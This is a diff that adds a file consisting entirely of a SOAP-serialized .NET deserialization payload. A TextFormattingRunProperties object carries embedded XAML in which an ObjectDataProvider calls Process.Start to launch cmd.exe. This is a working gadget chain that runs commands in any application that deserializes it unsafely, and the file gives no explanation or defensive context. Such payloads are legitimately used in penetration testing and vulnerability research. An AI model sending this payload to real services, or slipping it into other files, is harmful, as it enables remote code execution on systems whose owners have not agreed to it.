@@ -1,0 +1,16 @@
+<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<SOAP-ENV:Body>
+<a1:TextFormattingRunProperties id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
+<ForegroundBrush id="ref-3">&#60;?xml version=&#34;1.0&#34; encoding=&#34;utf-16&#34;?&#62;
+&#60;ObjectDataProvider MethodName=&#34;Start&#34; IsInitialLoadEnabled=&#34;False&#34; xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:sd=&#34;clr-namespace:System.Diagnostics;assembly=System&#34; xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;&#62;
+  &#60;ObjectDataProvider.ObjectInstance&#62;
+    &#60;sd:Process&#62;
+      &#60;sd:Process.StartInfo&#62;
+        &#60;sd:ProcessStartInfo Arguments=&#34;/c &#39;cmd.exe&#34; StandardErrorEncoding=&#34;{x:Null}&#34; StandardOutputEncoding=&#34;{x:Null}&#34; UserName=&#34;&#34; Password=&#34;{x:Null}&#34; Domain=&#34;&#34; LoadUserProfile=&#34;False&#34; FileName=&#34;cmd&#34; /&#62;
+      &#60;/sd:Process.StartInfo&#62;
+    &#60;/sd:Process&#62;
+  &#60;/ObjectDataProvider.ObjectInstance&#62;
+&#60;/ObjectDataProvider&#62;</ForegroundBrush>
+</a1:TextFormattingRunProperties>
+</SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
